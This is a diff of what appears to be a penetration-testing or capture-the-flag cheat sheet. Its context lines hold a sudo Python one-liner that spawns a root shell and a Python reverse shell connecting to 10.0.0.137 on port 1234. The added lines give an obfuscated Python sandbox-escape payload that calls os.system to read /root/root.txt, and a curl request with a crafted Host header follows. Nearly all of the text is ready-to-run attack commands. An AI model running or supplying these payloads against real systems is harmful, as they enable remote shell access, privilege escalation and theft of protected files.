@@ -10,6 +10,10 @@ sudo python3.5 -c ‘import os; os.system(“/bin/sh”)’
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.137",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 ```
+python escape characters:
+```
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
+```
 #can be used to find real host name.
 ```
 curl -H 'Host: http://172.16.226.6' "http://172.16.226.6/'"
